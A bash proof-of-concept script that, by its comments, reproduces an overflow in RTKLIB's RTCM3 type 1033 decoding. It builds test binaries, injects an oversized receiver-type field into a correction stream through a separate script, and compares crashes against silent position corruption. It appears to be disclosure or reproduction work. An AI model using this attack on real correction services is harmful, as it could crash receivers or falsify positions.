#!/bin/bash
# End-to-end: malicious RTCM3 type 1033 in a correction stream -> rtksvr.
#
# Unlike downstream.sh, nothing is spliced by hand at the struct level: the
# attack message travels in the base correction stream and is decoded by
# RTKLIB's real-time server.
#
#   RTKLIB=/path/to/RTKLIB ./e2e.sh [rectype_len]
#
# Two builds are run, because the outcome depends on whether glibc's
# _FORTIFY_SOURCE is active:
#   fortified   -> the fortified strncpy aborts the process (remote DoS)
#   unfortified -> the write goes through silently (position corruption)
#
# Deliberately no `set -e`: half the runs here are expected to die on SIGABRT,
# and that is the result, not an error.

RTKLIB="${RTKLIB:?set RTKLIB to your RTKLIB checkout}"
PY="${PY:-python3}"
LEN="${1:-212}"
D="$RTKLIB/test/data/rinex"
T="${T:-/tmp/rtk-e2e}"
mkdir -p "$T"
export LIBC_FATAL_STDERR_=1

# RTCM3 1019 carries a 10-bit GPS week, so a 2005 dataset decodes into the
# wrong 1024-week rollover window when replayed today. Shift it forward.
export SHIFT_WEEKS="${SHIFT_WEEKS:-1024}"

echo "### building ###"
gcc -I "$RTKLIB/src" -O2 -o "$T/rnx2rtcm3" rnx2rtcm3.c \
    "$RTKLIB"/src/*.c "$RTKLIB"/src/rcv/*.c -lm -lpthread 2>/dev/null
gcc -I "$RTKLIB/src" -O2 -D_FORTIFY_SOURCE=2 -o "$T/e2e_fortified" \
    e2e_harness.c "$RTKLIB"/src/*.c "$RTKLIB"/src/rcv/*.c -lm -lpthread 2>/dev/null
gcc -I "$RTKLIB/src" -O2 -U_FORTIFY_SOURCE -o "$T/e2e_plain" \
    e2e_harness.c "$RTKLIB"/src/*.c "$RTKLIB"/src/rcv/*.c -lm -lpthread 2>/dev/null

echo
echo "### encoding RINEX -> RTCM3 (shifted $SHIFT_WEEKS weeks) ###"
"$T/rnx2rtcm3" "$D/07590920.05o" "$D/07590920.05n" "$T/rover.rtcm3" 759
"$T/rnx2rtcm3" "$D/30400920.05o" "$D/07590920.05n" "$T/base.rtcm3"  3040

echo
echo "### injecting type 1033 (rectype len=$LEN) ###"
"$PY" inject_1033.py "$T/base.rtcm3" "$T/base_attack.rtcm3" --len "$LEN"
"$PY" inject_1033.py "$T/base.rtcm3" "$T/base_benign.rtcm3" --len 10 >/dev/null

cd "$T"
run () {  # binary label stream
    out=$("./$1" rover.rtcm3 "$3" 10 500 2>&1) && rc=0 || rc=$?
    fb=$(echo "$out" | grep -o 'final base position:.*')
    printf '  %-22s rc=%-4s %s\n' "$2" "$rc" "${fb:-*** aborted, no output ***}"
}

echo
echo "### fortified build (-D_FORTIFY_SOURCE=2) ###"
run e2e_fortified "clean"        base.rtcm3
run e2e_fortified "benign 1033"  base_benign.rtcm3
run e2e_fortified "attack 1033"  base_attack.rtcm3

echo
echo "### unfortified build (-U_FORTIFY_SOURCE) ###"
run e2e_plain "clean"        base.rtcm3
run e2e_plain "benign 1033"  base_benign.rtcm3
run e2e_plain "attack 1033"  base_attack.rtcm3

echo
echo "base station truth: -3978242.4348 3382841.1715 3649902.7667"
